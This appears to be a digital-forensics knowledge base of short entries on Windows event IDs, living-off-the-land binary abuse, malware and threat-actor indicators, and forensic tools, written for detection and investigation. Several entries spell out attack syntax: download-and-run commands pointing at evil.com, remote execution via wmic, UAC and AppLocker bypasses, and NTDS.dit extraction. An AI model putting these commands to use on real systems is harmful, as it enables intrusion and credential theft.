title: Windows Logon Type Reference
content: Windows logon type codes for Event ID 4624: Type 2 (Interactive) = direct keyboard logon. Type 3 (Network) = file shares, net use, PsExec first stage. Type 4 (Batch) = scheduled task. Type 5 (Service) = service startup. Type 7 (Unlock) = workstation unlock. Type 8 (NetworkCleartext) = IIS basic auth, network logon with cleartext password. Type 9 (NewCredentials) = runas /netonly, preserves local token but uses new creds for network. Type 10 (RemoteInteractive) = RDP. Type 11 (CachedInteractive) = domain logon without DC contact. Forensic value: Type 10 = RDP, Type 3+NTLM+IP = pass-the-hash, Type 2 for service account = suspicious.

title: Shortcut Modification
content: Adversaries may create or edit shortcuts to run their tools for persistence. Methods: modify existing desktop shortcuts to also run malware, create new shortcuts in startup folder, modify LNK files to point to malicious files. Detection: LNK files in Startup folders (C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp, C:\Users\[user]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup), LNK files with modified targets (LECmd analysis), MFT timestamps of recently created/modified LNK files.

title: Sigma: Suspicious New User Account
content: Sigma rule for suspicious account creation. Detection: Event 4720 (account created) followed within 60 seconds by 4732 (added to local group). High confidence: account added to Administrators, Remote Desktop Users, or other privileged local groups immediately after creation. Account name matching patterns: admin[0-9]+, support[0-9]+, helpdesk, svc followed by random chars, names mimicking existing admin accounts with character substitution. Correlate with 4624 to identify who was logged on when account was created.

title: DFIR Investigation Mindset
content: Core DFIR investigation principles: 1) Evidence speaks; you interpret. State what the data shows, not what you think happened. 2) Absence of evidence is not evidence of absence. Missing logs = possible clearing. 3) Corroborate before concluding. Single-source findings are INFERRED, not CONFIRMED. 4) Timeline first. Build chronology before drawing conclusions. 5) Follow the evidence, not your hypothesis. If data contradicts theory, revise theory. 6) Anti-forensics are evidence. Deleted logs and timestomped files tell a story. 7) Document everything. If you didn't write it down, it didn't happen in court. CaseFile enforces these principles structurally via confidence levels, evidence quotes, and audit trails.

title: Visual Basic
content: Adversaries may abuse Visual Basic (VB) for execution. VBS files run via wscript.exe or cscript.exe, VBA macros in Office documents run via Office applications. Detection: wscript.exe or cscript.exe spawning from Office or email client, .vbs files in Temp/Downloads/AppData, Event 4688 showing VBS execution, PowerShell spawning from VBS (common macro chain), Office applications spawning script hosts. VBA macro execution leaves Office process in Prefetch with macro-triggered child processes in Event 4688 parent-child chain.

title: JavaScript
content: Adversaries may abuse various implementations of JavaScript for execution. Windows: JScript via wscript.exe/cscript.exe, mshta executing JavaScript, rundll32 executing JavaScript via ActiveXObject. Detection: wscript.exe running .js files, mshta with JavaScript: URI scheme, rundll32 with javascript: in arguments, Event 4688 showing script host processes with .js files, browser processes spawning child processes. JavaScript-based stagers download and execute second-stage payloads.

title: Forensic Standards and Legal Admissibility
content: Key forensic standards for legal admissibility: 1) Daubert standard (US): scientific testimony must be peer-reviewed, testable, and accepted by scientific community. 2) Authentication: evidence must be what it purports to be (SHA-256 hashes provide cryptographic authentication). 3) Best evidence rule: original or forensic copy with verified hash. 4) Chain of custody: unbroken documentation from collection to court. 5) Examiner qualifications: methodology must be reproducible by qualified peer. CaseFile provides: SHA-256 source hash, audit trail of every tool action, examiner identity in all records, reproducible methodology documented in dataset.md.

title: Event ID 4625: Failed Logon
content: Event ID 4625 records failed account logon attempts. Key fields: TargetUserName (account attempted), LogonType (2=interactive, 3=network, 10=RDP), FailureReason (wrong password, account locked, etc.), IpAddress (source). Forensic value: Password spraying shows many accounts from one IP each tried once. Brute force shows one account from one IP many times. Account lockout (4740) follows 4625 bursts. Correlate with 4624 after 4625 spikes to find successful logons after failed attempts. Sub-Status codes: 0xC000006A=wrong password, 0xC0000064=unknown username, 0xC000006F=outside hours, 0xC0000234=account locked.

title: Event ID 4634/4647: Account Logoff
content: Event ID 4634 (system-generated logoff) and 4647 (user-initiated logoff) record session termination. Key fields: TargetUserName, LogonType, LogonID (matches corresponding 4624). Forensic value: Calculate session duration by pairing 4624 with 4634/4647 using LogonID. Absence of logoff for interactive sessions may indicate crash or forced termination. RDP sessions (type 10) generate 4634 on disconnect, 4779 on reconnect. Long-running sessions (days) on server accounts indicate persistent access.

title: Event ID 4672: Special Privileges Assigned
content: Event ID 4672 records when special privileges (SeDebugPrivilege, SeTcbPrivilege, SeBackupPrivilege, etc.) are assigned to a new logon. Generated alongside 4624 for privileged accounts. Forensic value: SeDebugPrivilege allows reading any process memory (LSASS dumping). SeTcbPrivilege allows acting as OS. SeBackupPrivilege allows reading any file regardless of ACL. Unusual accounts with SeDebugPrivilege indicate credential dumping preparation. Always paired with a 4624 -- correlate LogonID.

title: Event ID 4740: Account Locked Out
content: Event ID 4740 records account lockout. Key fields: TargetUserName (locked account), SubjectComputerName (machine that caused lockout). Forensic value: Account lockout indicates brute force or password spray. Source computer field reveals originating machine -- if not the user's workstation, lateral movement or remote attack. Multiple accounts locked from same source = password spray. One account locked from many sources = distributed attack. Lockout policy threshold reveals minimum attempts (typically 3-10).

title: Event ID 4768/4771: Kerberos Authentication
content: Event ID 4768 (TGT requested) and 4771 (pre-auth failed) on domain controllers record Kerberos authentication. Key fields: AccountName, ClientAddress, TicketOptions, FailureCode. 4771 FailureCodes: 0x12=account disabled, 0x17=password expired, 0x18=wrong password, 0x25=clock skew. Forensic value: 4771 with 0x18 indicates brute force on Kerberos. Missing 4768 before 4769 may indicate pass-the-ticket (using stolen TGT). Unusual ClientAddress (non-corporate IP) indicates external Kerberos authentication.

title: Event ID 4776: NTLM Authentication
content: Event ID 4776 records NTLM credential validation on the domain controller. Key fields: AccountName, Workstation, ErrorCode. ErrorCodes: 0x0=success, 0xC000006A=wrong password, 0xC0000064=unknown account. Forensic value: NTLM to DC from workstations indicates pass-the-hash attempts (Kerberos preferred in domain). High volume 4776 events indicate NTLM relay or brute force. 4776 without corresponding 4624 on source machine indicates remote NTLM authentication. Workstation field reveals source of NTLM auth.

title: Event ID 4657: Registry Value Modified
content: Event ID 4657 records registry value modification (requires Object Access SACL auditing). Key fields: ObjectName (full registry path), OldValue, NewValue, SubjectUserName. Forensic value: Persistence registry changes (Run keys, services, COM hijacking), security tool disabling (Defender settings), audit policy changes. Rarely enabled by default -- if present, provides direct evidence of registry modifications with before/after values. Correlate with RECmd output timestamps to identify what changed and when.

title: Event ID 4656/4663: Object Access
content: Event ID 4656 (handle requested) and 4663 (object accessed) record file/registry/process object access (requires SACL auditing). Key fields: ObjectName, AccessMask (permissions requested), ProcessName. Access masks: 0x1 READ_DATA, 0x2 WRITE_DATA, 0x10 DELETE, 0x20 READ_CONTROL. Forensic value: 4656 with LSASS as ObjectName and PROCESS_VM_READ access = credential dumping attempt. File access patterns revealing data staging. Process handle grabs between suspicious processes indicating injection.

title: Event ID 5140/5145: Network Share Access
content: Event ID 5140 (network share accessed) and 5145 (network share object checked) record SMB share access. Key fields: ShareName (\\*\ADMIN$, \\*\C$, etc.), IpAddress, AccountName. 5145 includes specific file path. Forensic value: ADMIN$ access indicates administrative lateral movement (PsExec, WMI). C$ access indicates direct file system access remotely. IPC$ access indicates named pipe/RPC communication (WMI, DCOM). Multiple share accesses from single source in short timeframe = lateral movement sweep.

title: Event ID 4688: Process Creation (Enhanced)
content: Event ID 4688 with enhanced auditing records process creation with full command lines. Requires: Computer Configuration -> Windows Settings -> Security Settings -> Advanced Audit Policy -> Detailed Tracking -> Audit Process Creation = Success, AND HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit\ProcessCreationIncludeCmdLine_Enabled=1. Output: NewProcessName (full path), CommandLine (full args), ParentProcessName, SubjectUserName. Forensic value: Full command lines reveal attacker tools, encoded payloads, and lateral movement commands. Critical for detecting LOLBins abuse.

title: Event ID 4703: Token Right Adjusted
content: Event ID 4703 records when a token right (privilege) is enabled or disabled. Key fields: SubjectUserName, TargetUserName, EnabledPrivilegeList, DisabledPrivilegeList. Forensic value: Privilege escalation tools enable SeDebugPrivilege, SeImpersonatePrivilege, or SeAssignPrimaryTokenPrivilege. Token manipulation attacks (T1134) show unusual privilege adjustments. Mimikatz privilege::debug generates 4703 for SeDebugPrivilege enable. Correlate with 4688 to link privilege adjustment to specific process.

title: Event ID 1100/1101/1108: Event Log Service Events
content: Event ID 1100 (event log service shutting down), 1101 (audit events dropped), 1108 (event processing error) in Security log. Forensic value: 1100 indicates system shutdown or event log service stopped -- correlate with timeline to identify shutdown/restart activity. 1101 indicates audit log buffer overflow (high-volume attack generating more events than buffer). 1108 indicates logging infrastructure failure. These events in the Security log itself provide metadata about logging integrity.

title: Event ID 4616: System Time Changed
content: Event ID 4616 records system time modification. Key fields: SubjectUserName, PreviousTime, NewTime. Forensic value: Attackers modify system time to corrupt forensic timestamps and confuse timeline analysis. Anti-forensics technique to make malware appear to have been installed years ago. Legitimate causes: NTP sync, VM snapshot restore, manual admin change. Unusual: time change outside NTP window, time set to past (timestomping support), time changed by non-SYSTEM account.

title: Event ID 6005/6006/6008/6009: System Start/Stop
content: System log events: 6005 (Event Log service started = system boot), 6006 (Event Log service stopped = clean shutdown), 6008 (unexpected shutdown -- power loss or crash), 6009 (Windows version at boot). Forensic value: Timeline anchors -- boot/shutdown times establish system availability windows. 6008 indicates crash or power loss (may indicate attacker pulling power to disrupt forensics). 6009 provides OS version confirmation. Gaps between 6006 and 6005 indicate downtime. Multiple 6008 events indicate system instability or tampering.

title: Event ID 4732/4728/4756: Group Membership Changes
content: Event ID 4732 (local group member added), 4728 (domain global group member added), 4756 (universal group member added). Key fields: MemberName, GroupName, SubjectUserName. Forensic value: Adding accounts to Administrators, Remote Desktop Users, or Domain Admins indicates privilege escalation or persistence. Service accounts added to privileged groups indicate compromise. Correlate with 4720 (account creation) -- if account created and immediately added to Admins, high confidence malicious. Also: 4733 (removed from local group).

title: Event ID 4946/4947/4950: Firewall Rule Changes
content: Windows Firewall events: 4946 (rule added), 4947 (rule modified), 4950 (setting changed). Forensic value: Attackers add firewall rules to allow inbound connections (RDP, reverse shells, C2). Rule names often mimic legitimate applications. 4950 disabling firewall is high confidence indicator. Correlate with new listening ports in netscan output -- firewall rule created shortly before new listener = staged backdoor. Event log: Microsoft-Windows-Windows Firewall With Advanced Security/Firewall.

title: Event ID 4625 on Domain Controllers: Bulk Analysis
content: 4625 events on DCs are critical for detecting domain-wide attacks. Analysis approach: 1) Count by TargetUserName -- many accounts = spray. 2) Count by IpAddress -- many IPs = distributed attack. 3) Check timing -- regular intervals = automated tool. 4) Check Sub-Status -- 0xC000006A (wrong password) vs 0xC0000064 (bad username). ANONYMOUS LOGON failures from internal IPs indicate NTLM relay. Kerberos failures (4771) alongside 4625 indicate mixed-protocol attack. High volume from single workstation IP = that workstation is compromised.

title: Event ID 7034/7035/7036: Service Control
content: System log service events: 7034 (service crashed unexpectedly), 7035 (service sent start/stop control), 7036 (service entered running/stopped state). Key fields: ServiceName, ImagePath (7034). Forensic value: 7034 for security services indicates AV/EDR crash (possibly triggered by attacker). 7036 stopped for Windows Defender/Firewall/EventLog = security tool disabling. 7035 for unusual services = external service control (PsExec). Pattern: multiple 7036 stopped events for security services in sequence = systematic security disabling.

title: LOLBAS: powershell.exe
content: PowerShell is the most abused LOLBin. Key abuse patterns: Download cradles (IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload')), encoded commands (-EncodedCommand [base64]), AMSI bypass (amsiutils reflection), constrained language mode bypass, reflective module loading, WMI interaction, registry manipulation, COM object instantiation. Detection: Script block logging (Event 4104), module logging (4103), transcription, AMSI telemetry. Parent process chains: winword.exe->powershell.exe = macro execution. Legitimate use: IT automation, management scripts.

title: LOLBAS: cmd.exe
content: cmd.exe (Windows Command Processor) abused for execution and evasion. Abuse patterns: Caret obfuscation (c^m^d = cmd), environment variable substitution (set a=cmd && call %a%), delayed expansion (!variable!), FOR loop execution, piped execution. Indicators: cmd.exe spawned by Office (macro), browser, or email. cmd.exe with /c flag executing encoded/obfuscated strings. cmd.exe from unusual paths (not System32). Command line contains percent signs (variable expansion obfuscation) or carets. Legitimate: system administration, batch scripts.

title: LOLBAS: wmic.exe
content: WMIC (Windows Management Instrumentation Command-line) abused for execution, discovery, and lateral movement. Abuse patterns: Remote execution (wmic /node:[IP] process call create '[cmd]'), local process execution, XSL script execution (wmic ... /format:[URL].xsl), alias execution. Detection: wmic.exe in Prefetch, Event 4688 with /node: parameter, WMI activity logs (Microsoft-Windows-WMI-Activity/Operational Event 5857-5861). wmic spawning cmd.exe or powershell.exe is high confidence. Lateral movement: wmic /node creates new process on remote system.

title: LOLBAS: cmstp.exe
content: cmstp.exe (Connection Manager Profile Installer) abused for UAC bypass and code execution. Abuse: Execute INF file with malicious RunPreSetupCommands (cmstp.exe /s /ns [inf_file]). UAC bypass: cmstp auto-elevated via COM object, no UAC prompt. Detection: cmstp.exe in Prefetch with unusual arguments, cmstp.exe spawning cmd.exe or powershell.exe (never happens legitimately), INF files in Temp directories. Legitimate use: installing VPN connection profiles (rare in modern environments).

title: LOLBAS: forfiles.exe
content: forfiles.exe iterates over files and executes commands. Abuse: Execute arbitrary commands bypassing AppLocker (forfiles /c 'cmd.exe /c [command]'). Does not invoke cmd.exe directly so process parent chain appears different. Detection: forfiles.exe with /c parameter in Event 4688, forfiles.exe spawning cmd.exe or powershell.exe, forfiles.exe in Prefetch from non-admin context. Legitimate use: batch file operations (delete logs older than N days).

title: LOLBAS: pcalua.exe
content: pcalua.exe (Program Compatibility Assistant) used to execute commands bypassing certain controls. Abuse: pcalua.exe -a [executable] to launch arbitrary programs. Useful for AppLocker bypass as pcalua is trusted. Detection: pcalua.exe with -a parameter pointing to unusual executable, pcalua.exe spawning unexpected children, pcalua.exe in Prefetch from non-standard contexts. Legitimate use: Program Compatibility Assistant for legacy application compatibility.

title: LOLBAS: SyncAppvPublishingServer.exe
content: SyncAppvPublishingServer.exe (App-V publishing server sync) abused for PowerShell execution bypassing execution policy. Abuse: SyncAppvPublishingServer.exe 'n;[PowerShell command]' executes arbitrary PowerShell without powershell.exe in process chain. Bypasses execution policy and some security products that monitor powershell.exe. Detection: SyncAppvPublishingServer.exe with unusual arguments in Event 4688, .vbs wrapper files, Prefetch showing unusual execution context.

title: LOLBAS: appsyncpublishingserver.vbs
content: appsyncpublishingserver.vbs VBScript used to execute PowerShell without invoking powershell.exe directly. Abuse pattern similar to SyncAppvPublishingServer.exe. Detection: cscript.exe or wscript.exe running appsyncpublishingserver.vbs with unusual arguments.

title: LOLBAS: ieexec.exe
content: ieexec.exe (Internet Explorer executable) downloads and executes remote binaries. Abuse: ieexec.exe http://evil.com/payload.exe downloads and runs payload. Bypasses some network controls as HTTP traffic appears as IE browsing. Detection: ieexec.exe with URL argument in Event 4688, ieexec.exe in Prefetch, network connections from ieexec.exe process. Legitimate use: None in modern environments (IE deprecated).

title: LOLBAS: replace.exe
content: replace.exe (file replacement utility) copies files, sometimes used to bypass file path restrictions. Abuse: Copy malicious file to sensitive locations using replace.exe which has different trust levels than copy/xcopy. Detection: replace.exe in Prefetch with unusual source/destination paths, Event 4688 with replace.exe targeting system directories. Legitimate use: File replacement during software updates.

title: LOLBAS: runscripthelper.exe
content: runscripthelper.exe used to execute PowerShell scripts in the context of Windows Update. Abuse: Execute arbitrary scripts with elevated trust. Detection: runscripthelper.exe with unusual script paths, execution outside Windows Update context.

title: LOLBAS: diskshadow.exe
content: diskshadow.exe (Volume Shadow Copy management) abused for NTDS.dit extraction and code execution. Abuse: Script mode (diskshadow /s [script.txt]) executes arbitrary commands. NTDS extraction: diskshadow expose shadow copy, then copy NTDS.dit from exposed shadow. Detection: diskshadow.exe in Prefetch, diskshadow.exe with /s parameter, script files containing exec commands, diskshadow.exe followed by ntds.dit copy operations. Legitimate use: VSS management by storage admins.

title: LOLBAS: xwizard.exe
content: xwizard.exe (Extensible Wizard) loads DLLs for wizard functionality. Abuse: DLL hijacking via xwizard.dll in same directory as xwizard.exe. Proxy execution for COM DLLs. Detection: xwizard.exe executing from non-System32 path, xwizard.dll in user-writable directories alongside xwizard.exe, unusual parent processes spawning xwizard.exe.

title: LOLBAS: msdeploy.exe
content: msdeploy.exe (Web Deploy) executes remote commands and transfers files. Abuse: Execute commands on remote IIS servers (msdeploy.exe -verb:sync -source:runCommand=[cmd]). Detection: msdeploy.exe with -source:runCommand in command line, unusual target servers, msdeploy.exe from non-IIS-admin context.

title: LOLBAS: scriptrunner.exe
content: scriptrunner.exe (Script Runner) executes scripts, abused to run arbitrary commands. Abuse: scriptrunner.exe -appvscript [script] executes scripts in App-V context. Detection: scriptrunner.exe with unusual script paths, execution from non-App-V context.

title: Emotet Malware Indicators
content: Emotet is a banking trojan/loader used for initial access and secondary payload delivery. Host indicators: Malicious Office macro documents (.doc, .xls) as initial vector, Emotet binary in %AppData% or %Temp% with random name, persistence via scheduled task or Run key, injected into legitimate processes (explorer.exe, svchost.exe via process injection). Network: HTTP C2 with POST requests to compromised WordPress sites, Emotet beacon traffic with specific User-Agent patterns, port 80/443/8080/7080/8443. Detection: Office spawning cmd.exe/PowerShell, new scheduled task after Office execution, unusual injected DLLs in explorer.exe.

title: Qakbot (QBot) Malware Indicators
content: Qakbot is a banking trojan evolved into an initial access broker. Host indicators: Delivered via malicious email attachments (HTML smuggling, ZIP with ISO/IMG), DLL side-loading via legitimate application (OneDrive, calculator), registry persistence (HKCU\SOFTWARE\Microsoft\[random]), injected into legitimate Windows processes, copies itself to AppData with random name. Network: HTTPS C2 to compromised hosts, SMTP worm spreading via email thread hijacking, SMB lateral movement. Memory: Qakbot hooks in ntdll.dll for evasion, browser credential theft, keylogger.

title: Bumblebee Loader Indicators
content: Bumblebee is a malware loader used to deliver Cobalt Strike, ransomware, and other payloads. Distribution: ISO/IMG files via email, virtual disk auto-run. Host indicators: ISO mounting (Windows 10+ auto-mounts), LNK file inside ISO executing DLL via rundll32.exe, DLL in ISO with unusual export function name. C2: HTTPS to hardcoded IP list with specific URI patterns (/gate). Memory: Process injection into explorer.exe or svchost.exe. Detection: ISO mounting event, rundll32.exe with unusual DLL path, network connections from explorer.exe.

title: LockBit Ransomware Forensic Indicators
content: LockBit is a ransomware-as-a-service (RaaS) operation. Pre-encryption TTPs: Initial access via RDP brute force or VPN credential abuse, Cobalt Strike for lateral movement, credential dumping (Mimikatz), Active Directory enumeration (ADFind/BloodHound), shadow copy deletion (vssadmin), AV/EDR disabling. Encryption: File extension changed to .lockbit or .lockbit2, ransom note Restore-My-Files.txt or LockBit_Ransomware.hta. Forensic: Prefetch shows vssadmin.exe, nltest.exe, adfind.exe, Mimikatz before encryption. MFT shows mass file modification in seconds.

title: Conti Ransomware Forensic Indicators
content: Conti ransomware operated as RaaS with leaked playbooks. Known TTPs from Conti playbooks: Initial access via Trickbot/BazarLoader, Cobalt Strike beacons, Anydesk for persistence, net.exe for domain enumeration, BloodHound/SharpHound for AD mapping, Rclone for exfiltration (rclone.exe in Prefetch), vssadmin for shadow copy deletion. File extension: .CONTI. Memory: Cobalt Strike named pipes, injected beacon processes. Detection: rclone.exe is a strong indicator (used almost exclusively for exfil in Conti attacks).

title: APT29 (Cozy Bear) TTPs
content: APT29 (Russia-linked, attributed to SVR) known for sophisticated, low-and-slow operations. Distinctive TTPs: WellMess and WellMail malware, SUNBURST supply chain compromise (SolarWinds), TEARDROP in-memory dropper, Cobalt Strike with custom malleable C2 profiles, abuse of legitimate cloud services (OneDrive, Dropbox for C2), living-off-the-land with PowerShell and WMI, GoldFinder and GoldMax malware. Forensic indicators: Unusual connections to cloud storage providers, PowerShell with encoded commands to cloud APIs, scheduled tasks with Base64-encoded PowerShell, registry-based payload storage.

title: APT41 (Double Dragon) TTPs
content: APT41 (China-linked, dual espionage + cybercrime) known for supply chain attacks and healthcare targeting. Distinctive TTPs: MESSAGETAP and KEYPLUG malware, supply chain compromise (NetSarang, CCleaner), web shells on internet-facing servers, Derusbi and PlugX RATs, living-off-the-land with built-in Windows tools, BITSAdmin and certutil for downloads. Forensic: Web shells in IIS webroot, certutil.exe in Prefetch for downloads, PlugX DLL side-loading via legitimate applications (Dropbox updater), Derusbi in svchost.exe memory.

title: FIN7 (Carbanak) TTPs
content: FIN7 is a financially motivated threat actor targeting retail and hospitality. Distinctive TTPs: Spearphishing with CARBANAK and PILLOWMINT malware, PowerShell-based infection chain, GRIFFON JavaScript backdoor, Cobalt Strike for post-exploitation, PoS RAM scrapers (memory scraping), BOOSTWRITE loader via DLL side-loading. Forensic: PowerShell with encoded commands from Office spawning, unusual JavaScript execution via wscript.exe, memory-resident malware with no file on disk (malfind), PoS process (javaw.exe, regsvc.exe) with unusual memory regions.

title: LAPSUS$ Group TTPs
content: LAPSUS$ is an extortion group known for social engineering and insider threats. Distinctive TTPs: SIM swapping for MFA bypass, insider recruitment (paying employees for access), advertise for corporate credentials on Telegram, Redline Stealer for credential harvesting, AnyDesk for persistence, NordVPN for anonymization, Mimikatz and ntdsutil for credential dumping, SharePoint/Confluence exfiltration for intellectual property. Detection: AnyDesk installation, Redline stealer in Prefetch/Amcache, ntdsutil in Prefetch, bulk SharePoint downloads.

title: BlackCat (ALPHV) Ransomware Indicators
content: BlackCat/ALPHV is a Rust-based ransomware group. Distinctive features: Written in Rust (unusual for ransomware), cross-platform (Windows/Linux/VMware ESXi), triple extortion (encrypt + exfiltrate + DDoS threat). Pre-encryption: ADFind, BloodHound, Cobalt Strike, Brute Ratel C4, ExMatter exfiltration tool, Fendr data exfiltration. Encryption: --access-token parameter, --no-prop (no propagation mode), ESXi targeting kills VMs before encrypting. Detection: Rust-compiled binary in Prefetch (unusual), ExMatter.exe in Prefetch, connections to dark web leak site.

title: Scattered Spider TTPs
content: Scattered Spider (0ktapus) targets large enterprises via social engineering. Distinctive TTPs: Help desk impersonation for password/MFA resets, SIM swapping, Okta and Azure AD credential abuse, lateral movement to Azure/AWS cloud environments, data exfiltration via Rclone, ALPHV/BlackCat ransomware deployment, Telegram for coordination, AnyDesk and Ngrok for persistence. Detection: Help desk ticket anomalies, MFA reset from unusual location, Ngrok.exe in Prefetch, Rclone exfiltration activity, Azure AD sign-in anomalies (impossible travel).

title: Volatility3: cmdline Plugin
content: volatility3 cmdline extracts command line arguments for all running processes from the PEB (Process Environment Block). Output fields: PID, Process, Args. Forensic value: Full command lines of running processes at acquisition time, reveals attacker tools with their arguments (C2 URLs, output paths, target credentials), scheduled task executables with parameters, service binary paths with arguments. Key limitation: Only captures processes running at acquisition time. Terminated processes not visible. Combine with pslist for complete picture.

title: Volatility3: dlllist Plugin
content: volatility3 dlllist lists loaded DLLs per process from the PEB InLoadOrderModuleList. Output: PID, Process, Base, Size, Name, Path, LoadTime. Forensic value: Detects DLL injection (unsigned DLLs, DLLs from unusual paths), DLL hijacking (legitimate name, wrong path), reflective loading (no path entry), malicious DLLs loaded by otherwise legitimate processes. Key investigative pattern: legitimate process (svchost, explorer) + DLL from Temp/AppData = injection. Compare DLL paths against expected locations for that process.

title: Volatility3: handles Plugin
content: volatility3 handles lists open handles per process (files, registry, process, thread, mutex, semaphore). Output: PID, Process, Offset, HandleValue, Type, GrantedAccess, Name. Forensic value: Process handles to LSASS with VM_READ (credential dumping), file handles revealing open malware files, mutex names identifying malware families (mutexes prevent multiple instances), process handles between processes revealing injection relationships, registry handles showing persistence key access. Mutexes are particularly useful -- malware families often use hardcoded mutex names.

title: Volatility3: vadinfo Plugin
content: volatility3 vadinfo dumps Virtual Address Descriptor (VAD) entries describing process memory regions. Output: PID, VadNode, Start, End, Tag, Protection, CommitCharge, PrivateMemory, Parent, File. Forensic value: Identifies suspicious memory regions (executable + writable = shellcode), finds memory-mapped files (DLLs, executables), detects process hollowing (legitimate executable path but modified memory content), finds heap spray regions. Protection flags: PAGE_EXECUTE_READWRITE is high suspicion. Combined with malfind for comprehensive injection detection.

title: Volatility3: timeliner Plugin
content: volatility3 timeliner aggregates timestamps from multiple memory artifacts into a unified timeline. Sources: process creation times, DLL load times, registry key times, network connection times. Output: datetime, plugin, description. Forensic value: Cross-artifact timeline from memory alone, correlates process start times with network activity, identifies clusters of activity (multiple processes created in seconds = dropper execution). Combine with disk-based timeline (MFT, event logs) for complete picture. Useful for establishing initial compromise timestamp.

title: EZ Tools: RecentFileCacheParser
content: RecentFileCache.bcf stores recently accessed files on Windows 7/8. Location: C:\Windows\AppCompat\Programs\RecentFileCache.bcf. Tool: RecentFileCacheParser.exe -f [file] --csv [output]. Output: Name (executable path). Forensic value: Complements Amcache on older systems, proves file execution, captures programs that don't appear in Amcache. Note: Deprecated in Windows 10+ (replaced by Amcache). Full path information often available.

title: EZ Tools: JLECmd (Jump List Parser)
content: JLECmd.exe parses Windows Jump List files. Location: C:\Users\[user]\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations and CustomDestinations. Command: JLECmd.exe -d [directory] --csv [output]. Output: SourceFile, SourceCreated, SourceModified, AppID, TargetCreated, TargetModified, TargetAccessed, TargetFileSize, TargetFullName, Arguments, WorkingDirectory, FileSize, FileAttributes. Forensic value: Application-specific recent file lists, mapped by AppID to application, reveals document access history even after file deletion, USB device usage via volume serial number.

title: EZ Tools: LECmd (LNK File Parser)
content: LECmd.exe parses Windows LNK (shortcut) files. Location: C:\Users\[user]\AppData\Roaming\Microsoft\Windows\Recent. Command: LECmd.exe -f [file.lnk] --csv [output]. Output: TargetCreated, TargetModified, TargetAccessed, TargetFileSize, TargetFullName, DriveType, VolumeSerialNumber, VolumeLabel, LocalPath, NetworkShareName, MacAddress. Forensic value: Proves file access even after deletion, USB device identification via volume serial number, network share access via UNC path, source machine identification via NetBIOS name and MAC address in target machine fields.

title: EZ Tools: SBECmd (Shellbag Explorer)
content: SBECmd.exe parses Windows Shellbag entries from NTUSER.DAT and UsrClass.dat. Command: SBECmd.exe -d [user_profile] --csv [output]. Key hives: NTUSER.DAT\Software\Microsoft\Windows\Shell\BagMRU+Bags, UsrClass.dat\Local Settings\Software\Microsoft\Windows\Shell. Output: Path, FirstInteracted, LastInteracted, MRUPosition. Forensic value: Folder access history persists after folder deletion, network share access (\\server\share), USB/external drive folder access, attacker reconnaissance of file system structure, deleted directory recovery.

title: EZ Tools: RBCmd (Recycle Bin Parser)
content: RBCmd.exe parses Windows Recycle Bin $I metadata files. Location: C:\$Recycle.Bin\[SID]. Command: RBCmd.exe -d [recycle_bin_path] --csv [output]. Output: FileName, FileSize, DeletedOn, OriginalName. Forensic value: Deleted file recovery metadata, original paths of deleted files, deletion timestamps, file sizes. Note: $I contains metadata, $R contains file content. Even after Recycle Bin emptied, $I metadata may remain in MFT as unallocated. Proves attacker deleted files and reveals what was deleted.

title: EZ Tools: PECmd (Prefetch Explorer)
content: PECmd.exe is the EZ Tools Prefetch parser (faster and more detailed than pyscca). Location: C:\Windows\Prefetch. Command: PECmd.exe -d [prefetch_dir] --csv [output]. Output per file: SourceCreated, SourceModified, LastRun, RunCount, FilesLoaded, Directories, Volumes. Key columns: LastRun (most recent execution), RunCount (total executions on Win8+), FilesLoaded (DLLs and resources accessed). Note: CaseFile uses pyscca library for compatibility, but PECmd provides richer output including all 8 run times on Win8+.

title: SRUM Network Usage Analysis
content: SRUM Network Usage table (SruDbIdMapTable + NetworkDataUsageMonitor) records bytes sent/received per application per hour over 30-60 days. Location: C:\Windows\System32\sru\SRUDB.dat (ESE database). Key tables: SRU_Network_Usage (app + network bytes), SRU_Application_Usage (CPU time, disk bytes). Forensic value for exfiltration: Sort by bytes_sent per application, processes with anomalous outbound data volume indicate exfiltration. Correlate timestamps with network logs. SRUM survives process termination and log clearing -- ideal for detecting C2 communication and data staging even after cleanup.

title: BAM/DAM Deep Dive
content: BAM (Background Activity Moderator) tracks execution for power management. Location: HKLM\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings\[SID]\[executable_path]. Key data: Each entry = full executable path + last execution timestamp (FILETIME). DAM (Desktop Activity Moderator) similar for desktop apps. Forensic value: Per-user execution evidence with timestamps, works even if Prefetch disabled (SSDs), captures apps run as different user accounts (per-SID). Limitation: Cleared on Windows reboot in some versions. Captures background execution that Prefetch may miss. Tool: RECmd with BAM batch file.

title: Amcache Deep Dive: SHA1 and Timing
content: Amcache.hve stores application compatibility data. Critical forensic details: SHA1 is computed on first 31.25MB of file (not full file) -- handles large binaries. FirstLinkedDate = when file was first connected/associated (not execution). LastModifiedTime2 = when registry entry was last modified. ProductName/CompanyName: Legitimate binaries from Microsoft have these populated; malware often does not. FileVersion/ProductVersion: Mismatches between these and binary metadata indicate tampering. Multiple entries per SHA1 possible if file moved/renamed. Amcache entries survive binary deletion -- proves file existed even if deleted.

title: Prefetch Timing Analysis
content: Prefetch timing forensics: Prefetch file Created timestamp = first execution time. Prefetch file Modified timestamp = last execution time. LastRunTime inside .pf file = most recent execution (same as Modified). Windows 8+ stores 8 run times inside .pf file. RunCount = total executions (capped implementation varies by OS). Forensic correlations: If Prefetch Created << MFT $SI Created = timestomping of executable. If Prefetch exists but binary deleted = proves execution after deletion. If RunCount=1 and LastRun is during incident window = first use at time of attack. Prefetch directory has 128 (WinXP/7) or 1024 (Win8+) file limit.

title: MFT Advanced Analysis
content: MFT advanced forensic techniques: 1) Zone.Identifier ADS: Files downloaded from internet have Zone.Identifier alternate data stream (ZoneId=3 = internet, ZoneId=2 = trusted sites). MFT shows HasAds=True for files with ADS. 2) Hard links: Multiple MFT entries for same file data (same FileReference but different paths). Attackers use hard links to bypass file deletion detection. 3) Sparse files: Large files with empty regions (SparseFile=True). 4) Reparse points: Symbolic links and mount points. 5) $I30 slack: Directory index slack space may contain deleted file entries. MFTECmd --csv output includes these flags.

title: Registry Advanced Forensics
